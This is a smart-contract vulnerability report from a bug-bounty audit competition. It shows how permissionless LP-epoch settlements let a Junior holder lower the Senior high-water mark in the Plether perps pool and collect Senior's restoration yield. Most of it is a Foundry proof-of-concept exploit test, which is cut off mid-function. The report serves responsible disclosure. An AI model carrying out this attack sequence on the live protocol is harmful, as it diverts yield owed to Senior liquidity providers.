# \#99984 [SC-High] Bootstrap Branch Overwrites The Senior High-Water Mark With an Unbacked Recapitalization Residual Leading to Theft Of Senior Restoration Yield by Junior Holders

**Submitted on Nov 16th 2026 at 00:18:00 UTC by @rubencrxz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99984
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
After a terminal deficit handled with the documented runbook (recapitalizePool, then clearDegradedMode), the part of the recapitalization that paid trader claims stays in pendingRecapitalizationAssets, although its cash has already left the pool. Every committed reconcile reserves it against pool equity, so the waterfall books a Senior loss that does not exist, and the empty-tranche bootstrap branch then rewrites the Senior high-water mark from the residual, lowering it below the full recapitalization intent d + X. The trading revenue that should restore Senior up to d + X then accrues to Junior, and no path restores the mark. Any Junior holder can trigger it with permissionless settles, and an honest keeper settling every epoch does the same.

## Vulnerability Details
Three pieces interact:

Reservation: capClaimantBuckets reserves min(pending, E) (HousePoolPendingPreviewLib.sol) and planReconcile subtracts it from the distributable amount (HousePoolReconcilePlanLib.sol), where E = pool assets − trader claims. After the runbook E holds only X, while pending still holds d.
Phantom loss: with pending >= E the waterfall input is zero, and absorbLoss (HousePoolWaterfallAccountingLib.sol) wipes Senior although its backing has not changed.
Bootstrap: _applyPendingClaimantBucketsLive (HousePool.sol) applies the reserved slice to the empty waterfall, and the bootstrap branch (HousePoolPendingPreviewLib.sol) sets the high-water mark to max(remaining pending, slice) without comparing it to the existing mark.
Attack sequence (all permissionless):

The owner recapitalizes d + X and clears degraded mode, and the trader claim is settled. After the first settle, Senior = X, high-water mark = d + X, pending = d.
A Junior holder transfers one share atom to a fresh account, which requests redemption of its full balance (the full-balance exception in TrancheVault.sol).
In the next epoch the holder calls settleLpEpoch. The zero-value head is refunded, which counts as progress, so the reconcile commits: Senior absorbs the phantom loss and the mark is rewritten.
A second settle repeats the rewrite against the remaining residual, leaving the mark below d + X.
Ordinary trading revenue restores Senior only up to the lowered mark; everything above it accrues to Junior, so Senior ends at least X below the control.
Negative control: with the same flows but without the extra settles, Senior is restored to d + X. An honest keeper settling ordinary Junior redemptions every epoch reaches the same mark as the attack.

This contradicts the spec and the code's own documentation. ACCOUNTING_SPEC.md:337 states "Losses do not reduce the Senior high-water mark", HousePoolWaterfallAccountingLib.sol leaves the mark unchanged "so future revenue continues to restore senior impairment", the bootstrap mark is documented as the "full recapitalization intent", and the project's test test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual asserts that the residual recap "should preserve senior's recovery target".

This is distinct from the residual settlement freeze, where settleLpEpoch reverts with HousePool__NoLpEpochProgress and rolls the reconcile back. Here the reconcile commits and is applied. Fixing the freeze makes this path run sooner, and a bootstrap branch that never lowers an existing mark fixes this without touching the freeze.

It is also not Cecuro MED-12, which accepts that partial-settlement residuals stay reserved: this report does not dispute the reservation, it shows the bootstrap rewriting a mark the spec declares immune to losses. The runbook (SECURITY.md) sets no recapitalization size, and the smallest one that reopens trading is fixed by the skew cap, so X < d in practice.

## Impact Details
Theft of unclaimed yield. The waterfall uses LP revenue to restore Senior up to its high-water mark before anything accrues to Junior (ACCOUNTING_SPEC.md:337, SECURITY.md). Once the mark is lowered, the revenue between the lowered mark and d + X, at least X, goes to Junior holders instead of Senior LPs. The attacker collects in proportion to their Junior holding, with no capital at risk and no dependence on price movement. No permissionless path restores the mark, so Senior's claim on that revenue is lost for good, and because an honest keeper produces the same transfer, Senior LPs lose it even without an attacker.

## References
packages/perps/src/HousePool.sol: _applyPendingClaimantBucketsLive, settleLpEpoch
packages/perps/src/libraries/HousePoolPendingPreviewLib.sol: capClaimantBuckets, bootstrap branch
packages/perps/src/libraries/HousePoolReconcilePlanLib.sol: planReconcile
packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol: absorbLoss
packages/perps/src/TrancheVault.sol: requestRedeem full-balance exception
packages/perps/ACCOUNTING_SPEC.md:337, packages/perps/SECURITY.md (runbook)
PoC: packages/perps/test/poc/RecapResidualWatermarkMinimalPath.t.sol

## Proof of Concept

## Proof of Concept

Proof of Concept
The PoC is a single Foundry test file that runs on commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It deploys the production `OrderRouter` with its sidecars and lifecycle book, and the only mocks are the out-of-scope components: Pyth (`MockPyth`, which relays signed prices) and USDG. It builds on the repository's own test base, `BasePerpTest`, with the release parameters from `packages/perps/DEPLOYMENT.md` installed through the 72-hour timelocks. No in-scope contract is modified.

1. Place the file at `packages/perps/test/poc/RecapResidualWatermarkMinimalPath.t.sol`.
2. From `packages/perps`, run: `forge test --match-path test/poc/RecapResidualWatermarkMinimalPath.t.sol --match-contract RecapResidualWatermarkMinimalPathTest -vv`

If Foundry's auto-installer fails to resolve `solc 0.8.35`, set `FOUNDRY_SOLC` to the official 0.8.35 release binary.

Steps reproduced

1. Setup (LPs, legitimate): 160k USDG in the Junior tranche (including a 50k Junior holder) and 350k USDG in the Senior tranche, deposited and claimed through ordinary LP epochs.
2. Terminal deficit (honest traders): following WHITEPAPER.md §2.3, a LONG book opened at 4/3 is closed at 2/3 and a SHORT book opened at 2/3 is closed at 1.37, so the two sides settle one after the other. Assertion: trader claims exceed pool assets; the deficit `d` is recorded.
3. Runbook (owner, SECURITY.md): `recapitalizePool(d + 2,741 USDG)`, the smallest recapitalization that re-admits a minimum open, then `clearDegradedMode`, the trader claim is serviced and one ordinary settlement commits. Assertions: Senior principal `== X`, Junior principal `== 0`, Senior high-water mark `== d + X`, `pendingRecapitalizationAssets == d`, distributable equity `== X`.
4. Attack (permissionless): the Junior holder twice moves one share atom to a fresh account, which requests redemption of its full balance, and calls `settleLpEpoch` in the next epoch. Assertion: both settlements commit.
5. Revenue: 40 epochs of ordinary trading revenue, identical in every scenario, followed by one ordinary settlement.
6. Assertions against the control: the Senior high-water mark is below `d + X`; Senior principal is lower by at least `X`; the Senior LP's position is worth less; the Junior holder's position is worth more; nothing is left unassigned.
7. Negative control (`test_control_withoutExtraSettlementsSeniorKeepsWatermark`): the same flows without the extra settlements; the high-water mark stays `d + X` and Senior is restored to `d + X`.
8. No attacker (`test_honestKeeperSettlingEveryEpochCausesSameSeniorLoss`): a keeper settles two ordinary Junior exits and then attempts a settlement every epoch; the resulting high-water mark and Senior principal equal those of the attack.

Expected output

[PASS] test_control_withoutExtraSettlementsSeniorKeepsWatermark()
[PASS] test_honestKeeperSettlingEveryEpochCausesSameSeniorLoss()
[PASS] test_juniorHolderSettlementsMoveSeniorWatermarkToJunior()
Suite result: ok. 3 passed; 0 failed; 0 skipped

Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title After the smallest admissible deficit and the smallest trading-reopening recapitalization, settlements move
///        the restored Senior high-water mark to Junior
/// @notice The terminal deficit comes from the sequential-settlement path the whitepaper documents (section 2.3) at
///         the smallest round trip the admission gate permits: a LONG entered at 4/3, a SHORT entered at 2/3 while the
///         LONG is open (the gate counts physical cash only), the LONG closed at 2/3 and the SHORT closed a little
///         above 4/3. The owner then follows the documented runbook with the smallest surplus `X` above the deficit
///         `d` that lets a minimum 1,000 USDG open pass the gates again. The bootstrap gives Senior `X` and a
///         high-water mark `d + X` and keeps `d` pending without cash. Any settlement while `d > E` wipes Senior
///         against that reserved residual and re-seeds the high-water mark with the remaining residual only, so
///         later trading revenue accrues to Junior instead of restoring Senior. A junior holder can force it with
///         1-share requests; an honest keeper settling ordinary exits does the same. Production contracts only;
///         Pyth and USDG are mocked.
contract RecapResidualWatermarkMinimalPathTest is BasePerpTest {

    // Initial release parameters (packages/perps/DEPLOYMENT.md), installed through the 72 h timelocks.
    uint256 internal constant RELEASE_VPI_FACTOR = 0.01e18;
    uint256 internal constant RELEASE_MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant RELEASE_MAINT_MARGIN_BPS = 10;
    uint256 internal constant RELEASE_INIT_MARGIN_BPS = 20;
    uint256 internal constant RELEASE_FAD_MARGIN_BPS = 300;
    uint256 internal constant RELEASE_BASE_CARRY_BPS = 500;
    uint256 internal constant RELEASE_MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant RELEASE_BOUNTY_BPS = 10;
    uint256 internal constant RELEASE_KEEPER_SHARE_BPS = 5000;
    uint256 internal constant RELEASE_EXECUTION_FEE_BPS = 4;
    uint256 internal constant RELEASE_FROZEN_CLOSE_SPREAD_BPS = 50;
    uint256 internal constant RELEASE_SETTLEMENT_BUFFER_BPS = 25;
    uint256 internal constant RELEASE_MIN_OPEN_NOTIONAL_ASSETS = 1000e6;
    uint256 internal constant RELEASE_ADVERSE_CONFIDENCE_MULTIPLIER_BPS = 2500;
    uint256 internal constant RELEASE_TRIGGER_BOUNTY_ASSETS = 200_000;
    uint256 internal constant RELEASE_MAX_PENDING_ORDERS = 5;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    uint256 internal constant LOT = 1e20; // 100 units: 100 USDG notional at a 1.00 basket
    uint256 internal constant CAP = 2e8;

    // Deficit path: LONG at 4/3, SHORT at 2/3, LONG closed at 2/3, SHORT closed at EXIT_PRICE.
    uint256 internal constant LONG_ENTRY = 133_333_333;
    uint256 internal constant SHORT_ENTRY = 66_666_667;
    uint256 internal constant EXIT_PRICE = 137_000_000;
    // Smallest surplus above the deficit that re-admits a minimum 1,000 USDG open after the runbook.
    uint256 internal constant RECAP_SURPLUS = 2741e6;
    uint256 internal constant REVENUE_ROUNDS = 40;

    address internal juniorLp = makeAddr("juniorLp");
    address internal juniorHolder = makeAddr("juniorHolder");
    address internal seniorLp = makeAddr("seniorLp");
    address internal exitLpA = makeAddr("exitLpA");
    address internal exitLpB = makeAddr("exitLpB");
    address internal longTrader = makeAddr("longTrader");
    address internal shortTrader = makeAddr("shortTrader");
    address internal hedgeTrader = makeAddr("hedgeTrader");
    address internal trader = makeAddr("trader");
    address internal keeper = makeAddr("keeper");

    OrderRouter internal orderRouter;
    uint256 internal px;
    uint256 internal clientNonce;
    uint256 internal requester;

    struct Outcome {
        uint256 deficit;
        uint256 revenue;
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 unassigned;
        uint256 highWaterMark;
        uint256 seniorLpValue;
        uint256 juniorHolderValue;
        uint256 juniorLpValue;
    }

    // ------------------------------------------------------------------ deployment
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Deploys the production OrderRouter (no test adapter) behind the base suite's router slot.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter production = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(production), predictedRouter, "router address");
        deployedRouter = LegacyOrderRouterHarness(payable(address(production)));
    }

    function setUp() public override {
        super.setUp();
        orderRouter = OrderRouter(payable(address(router)));
        px = 1e8;
        _enterLiveWindow();
        _fundLp(juniorVault, juniorLp, 100_000e6);
        _fundLp(juniorVault, juniorHolder, 50_000e6);
        _fundLp(juniorVault, exitLpA, 5000e6);
        _fundLp(juniorVault, exitLpB, 5000e6);
        _fundLp(seniorVault, seniorLp, 350_000e6);
        _applyReleaseConfig();
        _enterLiveWindow();
    }

    function _applyReleaseConfig() internal {
        ICfdEngineAdminHost.EngineRiskConfig memory risk;
        risk.riskParams = CfdTypes.RiskParams({
            vpiFactor: RELEASE_VPI_FACTOR,
            maxSkewRatio: RELEASE_MAX_SKEW_RATIO,
            maintMarginBps: RELEASE_MAINT_MARGIN_BPS,
            initMarginBps: RELEASE_INIT_MARGIN_BPS,
            fadMarginBps: RELEASE_FAD_MARGIN_BPS,
            baseCarryBps: RELEASE_BASE_CARRY_BPS,
            minBountyAssets: RELEASE_MIN_BOUNTY_ASSETS,
            bountyBps: RELEASE_BOUNTY_BPS,
            keeperShareBps: RELEASE_KEEPER_SHARE_BPS,
            protocolShareBps: 0
        });
        risk.executionFeeBps = RELEASE_EXECUTION_FEE_BPS;
        risk.frozenCloseSpreadBps = RELEASE_FROZEN_CLOSE_SPREAD_BPS;
        risk.settlementBufferBps = RELEASE_SETTLEMENT_BUFFER_BPS;
        engineAdmin.proposeRiskConfig(risk);

        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = RELEASE_MIN_OPEN_NOTIONAL_ASSETS;
        rc.adverseConfidenceMultiplierBps = RELEASE_ADVERSE_CONFIDENCE_MULTIPLIER_BPS;
        rc.positionProtectionTriggerBountyAssets = RELEASE_TRIGGER_BOUNTY_ASSETS;
        rc.maxPendingOrders = RELEASE_MAX_PENDING_ORDERS;
        routerAdmin.proposeRouterConfig(rc);

        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = RELEASE_MAX_SENIOR_EXPOSURE_ASSETS;
        pc.maxSeniorShareBps = RELEASE_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(pc);

        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
    }

    // ------------------------------------------------------------------ oracle and keeper helpers
    function _payload(
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ups = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ups[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(px)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: prevPublishTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(ups);
    }

    function _tick() internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _mark() internal {
        _tick();
        uint256 t = vm.getBlockTimestamp();
        bytes[] memory data = _payload(t, t - 1);
        vm.prank(keeper);
        orderRouter.updateMarkPrice(data);
    }

    /// @dev Next Monday 10:00 UTC (live, non-FAD) with a fresh mark.
    function _enterLiveWindow() internal {
        uint256 day = vm.getBlockTimestamp() / 1 days;
        uint256 weekday = (day + 3) % 7; // 0 = Monday
        vm.warp((day + (weekday == 0 ? 7 : 7 - weekday)) * 1 days + 10 hours);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isFadWindow() || engine.isOracleFrozen(), "live window");
        _mark();
    }

    /// @dev Moves the mark to `target` in steps of at most 10 %.
    function _goTo(
        uint256 target
    ) internal {
        while (px != target) {
            if (target > px) {
                uint256 step = px + px / 10;
                px = step > target ? target : step;
            } else {
                uint256 step = px - px / 10;
                px = step < target ? target : step;
            }
            _mark();
        }
    }

    function _nextEpoch() internal {
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) + 60);
        vm.roll(vm.getBlockNumber() + 1);
        while (engine.isFadWindow() || engine.isOracleFrozen()) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            vm.roll(vm.getBlockNumber() + 1);
        }
        px = engine.lastMarkPrice();
    }

    /// @dev One settlement through OrderRouter.settleLpEpoch by `caller` at the start of the next live LP epoch.
    function _settleNextEpoch(
        address caller
    ) internal returns (bool ok) {
        _nextEpoch();
        _tick();
        uint256 t = vm.getBlockTimestamp();
        bytes[] memory data = _payload(t, t - 1);
        vm.prank(caller);
        (ok,) = address(orderRouter).call(abi.encodeCall(OrderRouter.settleLpEpoch, (data)));
    }

    function _fundLp(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        assertTrue(_settleNextEpoch(keeper), "deposit epoch settled");
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        assertEq(claimable, amount, "deposit accepted");
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    /// @dev Queue work for one settlement: one junior share moved to a fresh account that redeems its whole balance.
    function _oneShareRequest(
        address from
    ) internal {
        address a = address(uint160(uint256(keccak256(abi.encode("requester", ++requester)))));
        vm.prank(from);
        juniorVault.transfer(a, 1);
        vm.prank(a);
        juniorVault.requestRedeem(1, a, a);
    }

    /// @dev An ordinary exit: a junior LP requests redemption of its whole (wiped) balance.
    function _exitRequest(
        address lp
    ) internal {
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        juniorVault.requestRedeem(shares, lp, lp);
    }

    // ------------------------------------------------------------------ order helpers (production V3 surface)
    function _depositMargin(
        address t,
        uint256 amount
    ) internal {
        settlementToken.mint(t, amount);
        vm.startPrank(t);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(t, amount);
        vm.stopPrank();
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory req) {
        uint256 window = orderRouter.maxExecutionWindowSeconds();
        req = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(++clientNonce),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: orderRouter.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _executeHead() internal {
        uint64 head = orderRouter.nextExecuteId();
        (IOrderRouterAccounting.PendingOrderView memory pv,) = orderRouter.getPendingOrderView(head);
        _tick();
        uint256 nowT = vm.getBlockTimestamp();
        uint256 pt = uint256(pv.commitTime) + 1;
        if (engine.lastMarkTime() > pt) pt = engine.lastMarkTime();
        if (pt > nowT) pt = nowT;
        bytes[] memory data = _payload(pt, pv.commitTime);
        vm.prank(keeper);
        orderRouter.executeOrder(head, data);
    }

    function _size(
        address t
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(t);
    }

    function _openPosition(
        address t,
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin
    ) internal {
        _mark();
        uint256 s0 = _size(t);
        OrderV3Types.OrderRequest memory req = _request(side, lots * LOT, margin, false);
        vm.prank(t);
        orderRouter.commitOrder(req);
        _executeHead();
        assertEq(_size(t), s0 + lots * LOT, "open filled");
    }

    function _closePosition(
        address t
    ) internal {
        _mark();
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(t);
        OrderV3Types.OrderRequest memory req = _request(side, size, 0, true);
        vm.prank(t);
        orderRouter.commitOrder(req);
        _executeHead();
        assertEq(_size(t), 0, "close filled");
    }

    /// @dev Self-call wrapper so a rejected open rolls back cleanly.
    function extOpen(
        address t,
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin
    ) external {
        require(msg.sender == address(this), "self");
        _openPosition(t, side, lots, margin);
    }

    function _distributable() internal view returns (uint256) {
        uint256 a = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return a > c ? a - c : 0;
    }

    // ------------------------------------------------------------------ deficit path
    /// @dev Opens `lots` per side in skew-bounded chunks. LONG at `eL`; SHORT at `eS` (after the LONG, while it is
    ///      open). When the entries differ, a temporary hedge SHORT keeps the LONG's opening skew inside the gate.
    function _book(
        uint256 eL,
        uint256 eS,
        uint256 lots,
        uint256 marginBps
    ) internal {
        _goTo(eL);
        uint256 chunk = (_distributable() * 35 / 100) / eL; // lots per chunk: chunk notional <= 35 % of depth
        address counter = eL == eS ? shortTrader : hedgeTrader;
        uint256 done;
        while (done < lots) {
            uint256 c = lots - done < chunk ? lots - done : chunk;
            _openPosition(longTrader, CfdTypes.Side.LONG, c, (c * eL * marginBps) / 10_000);
            _openPosition(counter, CfdTypes.Side.SHORT, c, (c * eL * marginBps) / 10_000);
            done += c;
        }
        if (eL == eS) return;
        _closePosition(hedgeTrader);
        _goTo(eS);
        chunk = (_distributable() * 35 / 100) / eS;
        done = 0;
        while (done < lots) {
            uint256 c = lots - done < chunk ? lots - done : chunk;
            _openPosition(shortTrader, CfdTypes.Side.SHORT, c, (c * eS * marginBps) / 10_000);
            done += c;
        }
    }

    /// @dev Largest per-side lot count the endpoint gate admits for the given entries (1 % headroom for VPI).
    function _maxLots(
        uint256 eL,
        uint256 eS
    ) internal view returns (uint256) {
        uint256 m = eL > CAP - eS ? eL : CAP - eS; // endpoint profit per lot, in USDG atoms
        return (_distributable() * 9900) / (10_025 * m);
    }

    /// @dev Sequential settlement: LONG closes at `p1`, then SHORT closes at `p2`. Returns the terminal deficit.
    function _deficitPath(
        uint256 eL,
        uint256 eS,
        uint256 p1,
        uint256 p2,
        uint256 marginBps
    ) internal returns (uint256 d, uint256 lots) {
        _depositMargin(longTrader, 10_000_000e6);
        _depositMargin(shortTrader, 10_000_000e6);
        _depositMargin(hedgeTrader, 10_000_000e6);
        lots = _maxLots(eL, eS);
        _book(eL, eS, lots, marginBps);
        _goTo(p1);
        _closePosition(longTrader);
        _goTo(p2);
        _closePosition(shortTrader);
        uint256 cash = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        d = claims > cash ? claims - cash : 0;
    }

    /// @dev Runbook (SECURITY.md:1499-1512): no open positions, recapitalize d + x so E >= L, clear degraded mode,
    ///      the claim is serviced, ordinary bootstrap settlement.
    function _runbook(
        uint256 d,
        uint256 x
    ) internal {
        uint256 recap = d + x;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();
        vm.prank(shortTrader);
        engine.settleTraderClaim(shortTrader);
        _oneShareRequest(juniorLp);
        assertTrue(_settleNextEpoch(keeper), "bootstrap settle");
    }

    /// @dev Whether a minimum 1,000 USDG open (either side) passes the gates at the current mark.
    function _minimumOpenAdmitted() internal returns (bool) {
        _depositMargin(trader, 10_000e6);
        uint256 lots = (RELEASE_MIN_OPEN_NOTIONAL_ASSETS + px - 1) / px; // px atoms per lot
        for (uint256 s; s < 2; ++s) {
            CfdTypes.Side side = s == 0 ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG;
            try this.extOpen(trader, side, lots, 300e6) {
                _closePosition(trader);
                return true;
            } catch {}
        }
        return false;
    }

    /// @dev Trading revenue: one LONG per epoch, sized to 35 % of depth, loses to the pool on a +20 % move.
    function _revenueRound() internal returns (uint256 g) {
        _nextEpoch();
        uint256 base = px;
        uint256 lots = (_distributable() * 35 / 100) / base;
        uint256 minLots = (RELEASE_MIN_OPEN_NOTIONAL_ASSETS + base - 1) / base;
        if (lots < minLots) lots = minLots;
        uint256 before = pool.totalAssets();
        _openPosition(trader, CfdTypes.Side.LONG, lots, (lots * base * 30) / 100);
        _goTo(base + base / 5);
        _closePosition(trader);
        g = pool.totalAssets() - before;
        _goTo(base);
    }

    // ------------------------------------------------------------------ scenario
    function _deficitAndRunbook() internal returns (uint256 d) {
        (d,) = _deficitPath(LONG_ENTRY, SHORT_ENTRY, SHORT_ENTRY, EXIT_PRICE, 100);
        assertGt(d, RECAP_SURPLUS, "surplus below the deficit");
        _runbook(d, RECAP_SURPLUS);
        assertEq(pool.seniorPrincipal(), RECAP_SURPLUS, "Senior bootstrapped with the backed surplus");
        assertEq(pool.juniorPrincipal(), 0, "Junior wiped");
        assertEq(pool.seniorHighWaterMark(), d + RECAP_SURPLUS, "Senior watermark is the full recapitalization");
        assertEq(pool.pendingRecapitalizationAssets(), d, "deficit part stays pending");
        assertEq(_distributable(), RECAP_SURPLUS, "only the surplus is backed by cash");
    }

    function _outcome(
        uint256 d,
        uint256 g
    ) internal view returns (Outcome memory o) {
        o.deficit = d;
        o.revenue = g;
        o.seniorPrincipal = pool.seniorPrincipal();
        o.juniorPrincipal = pool.juniorPrincipal();
        o.unassigned = pool.unassignedAssets();
        o.highWaterMark = pool.seniorHighWaterMark();
        o.seniorLpValue = seniorVault.convertToAssets(seniorVault.balanceOf(seniorLp));
        o.juniorHolderValue = juniorVault.convertToAssets(juniorVault.balanceOf(juniorHolder));
        o.juniorLpValue = juniorVault.convertToAssets(juniorVault.balanceOf(juniorLp));
    }

    function _log(
        string memory tag,
        Outcome memory o
    ) internal pure {
        console2.log(tag);
        console2.log("  deficit d / revenue G", o.deficit, o.revenue);
        console2.log("  Senior principal / high-water mark", o.seniorPrincipal, o.highWaterMark);
        console2.log("  Junior principal / unassigned", o.juniorPrincipal, o.unassigned);
        console2.log("  seniorLp / juniorHolder / juniorLp value", o.seniorLpValue, o.juniorHolderValue, o.juniorLpValue);
    }

    /// @dev mode 0: no extra settlement; 1: junior holder forces two settlements with 1-share requests;
    ///      2: honest keeper settles every epoch, queue work comes from two ordinary junior exits.
    function _run(
        uint8 mode
    ) internal returns (Outcome memory o) {
        uint256 d = _deficitAndRunbook();
        if (mode == 1) {
            for (uint256 i; i < 2; ++i) {
                _oneShareRequest(juniorHolder);
                assertTrue(_settleNextEpoch(juniorHolder), "junior holder settlement commits");
            }
        }
        if (mode == 2) {
            _exitRequest(exitLpA);
            assertTrue(_settleNextEpoch(keeper), "keeper settles the first exit");
            _exitRequest(exitLpB);
            assertTrue(_settleNextEpoch(keeper), "keeper settles the second exit");
        }
        _depositMargin(trader, 10_000_000e6);
        uint256 g;
        for (uint256 i; i < REVENUE_ROUNDS; ++i) {
            g += _revenueRound();
            if (mode == 2) _settleNextEpoch(keeper); // honest keeper tries every epoch; no work -> no commit
        }
        _oneShareRequest(juniorLp);
        assertTrue(_settleNextEpoch(keeper), "final settle");
        o = _outcome(d, g);
    }

    // ------------------------------------------------------------------ tests
    /// @notice Two settlements forced by a junior holder cut the Senior high-water mark; Junior collects the cut.
    function test_juniorHolderSettlementsMoveSeniorWatermarkToJunior() public {
        uint256 snap = vm.snapshotState();
        Outcome memory control = _run(0);
        vm.revertToState(snap);
        Outcome memory attacked = _run(1);
        _log("without extra settlements", control);
        _log("with two junior-holder settlements", attacked);
        uint256 d = attacked.deficit;
        assertGt(attacked.revenue, 2 * d, "revenue covers both outcomes");
        assertEq(control.highWaterMark, d + RECAP_SURPLUS, "control keeps the full watermark");
        assertLt(attacked.highWaterMark, d + RECAP_SURPLUS, "Senior watermark cut");
        assertGe(control.seniorPrincipal - attacked.seniorPrincipal, RECAP_SURPLUS - 5e6, "Senior loses at least X");
        assertLt(attacked.seniorLpValue, control.seniorLpValue, "Senior LP worse off");
        assertGt(attacked.juniorHolderValue, control.juniorHolderValue, "junior holder gains");
        assertEq(attacked.unassigned, 0, "nothing unassigned");
    }

    /// @notice Control: without extra settlements Senior keeps its full watermark d + X.
    function test_control_withoutExtraSettlementsSeniorKeepsWatermark() public {
        Outcome memory o = _run(0);
        _log("control", o);
        assertEq(o.highWaterMark, o.deficit + RECAP_SURPLUS, "full watermark");
        assertEq(o.seniorPrincipal, o.deficit + RECAP_SURPLUS, "Senior restored to d + X");
    }

    /// @notice An honest keeper settling ordinary junior exits every epoch causes the same Senior loss.
    function test_honestKeeperSettlingEveryEpochCausesSameSeniorLoss() public {
        uint256 snap = vm.snapshotState();
        Outcome memory attacked = _run(1);
        vm.revertToState(snap);
        Outcome memory control = _run(0);
        vm.revertToState(snap);
        Outcome memory honest = _run(2);
